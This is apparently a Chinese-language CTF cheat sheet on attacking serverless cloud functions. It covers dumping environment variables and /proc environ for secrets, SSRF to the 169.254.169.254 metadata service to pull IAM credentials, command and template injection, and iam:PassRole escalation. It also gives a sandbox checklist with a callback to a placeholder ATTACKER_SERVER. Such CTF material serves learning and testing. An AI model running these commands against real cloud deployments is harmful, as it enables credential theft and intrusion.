# Serverless / 云函数攻击

> 适用：CloudFunc、AWS Lambda、Azure Functions、Google Cloud Functions、阿里云函数计算等 FaaS 题目。

## 识别 FaaS
- 响应头/错误页含 `Lambda`、`Function`、`CloudFunc`、`函数计算`、`edge`。
- 入口通常是 HTTP API（APIGateway / 函数 URL），后端无持久服务器。
- 常见路径：`/2015-03-31/functions/.../invocations`、`/runtime/`。

## 核心攻击面（按优先级）

### 1. 环境变量与临时凭据泄露
FaaS 函数常把 flag 或云凭据放在环境变量里，函数代码可读：
```bash
# 若函数代码可执行命令
env
cat /proc/self/environ | tr '\0' '\n'
# AWS Lambda 运行时 API 可被函数内 SSRF 利用
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 2. 函数代码/事件注入
- 函数处理用户输入（event/body）时，注入触发 RCE 或读文件：
  - 模板注入（若用 `eval`/`render_template_string`）
  - 命令拼接（`os.system("echo " + user_input)`）
- 函数冷启动会把源码放在 `/var/task/`、`/workspace/`，找到可写目录后写 shell 或读源码。

### 3. Lambda SSRF（函数里发 URL 请求）
- 函数若接受 URL 参数并 fetch，直接 SSRF 到云元数据：
  ```bash
  curl -s "http://TARGET/function?url=http://169.254.169.254/latest/meta-data/"
  curl -s "http://TARGET/function?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  ```
- 拿到的临时凭据可用于 AWS CLI（若有），或直接带 `Authorization` 头调云 API。

### 4. 函数更新/提权（云凭据在握时）
- `iam:PassRole` + `lambda:CreateFunction` → 用高权角色创建函数执行命令。
- 目标：读其他服务的 flag（S3、DynamoDB、Secrets Manager）。

## 通用排查顺序
1. `env` / `/proc/self/environ` → 找 flag 或凭据。
2. 找源码（`/var/task/*`、`/workspace/*`、函数日志）→ 找硬编码 key / 逻辑漏洞。
3. 函数接受 URL → 打 SSRF 到 metadata。
4. 函数接受文件上传/命令 → 直接 RCE。
5. 云凭据在握 → 枚举 S3/Secrets/其他函数。

## 沙箱能力测试（描述含「运行时限制/能力仍可用」时优先做）

题目描述出现「运行时限制」「哪些能力仍可用」「沙箱」「迁移后」等词时，说明
有代码/命令执行入口，但被沙箱部分限制。**逐个测试哪些能力仍然可用**，而不是
按常规流程枚举：

```bash
# 1. 文件读取（最常仍然可用）
cat /flag /flag.txt /challenge/flag* 2>/dev/null
cat /proc/1/environ | tr '\0' '\n' | grep -i flag

# 2. 命令执行（若 bash 被禁，换 python/perl/awk）
id; whoami; ls -la /
python3 -c 'import os; print(os.listdir("/"))'
perl -e 'print `ls -la /`'

# 3. 网络出站（SSRF/回连是否被禁）
curl -s http://169.254.169.254/latest/meta-data/ --max-time 3
curl -s http://ATTACKER_SERVER/ --max-time 3

# 4. 目录写（能否落 shell/计划任务）
touch /tmp/x && echo writable
echo '* * * * * bash -c "cat /flag > /tmp/f"' > /tmp/cron 2>/dev/null

# 5. 环境变量与进程
env | sort
ps aux
```

**要点**：迁移/沙箱类题的关键不是“找到漏洞”，而是“在已有执行能力里找出
未被限制的那一个”。先列出一个能力清单逐个打勾，不要只试一次就放弃。
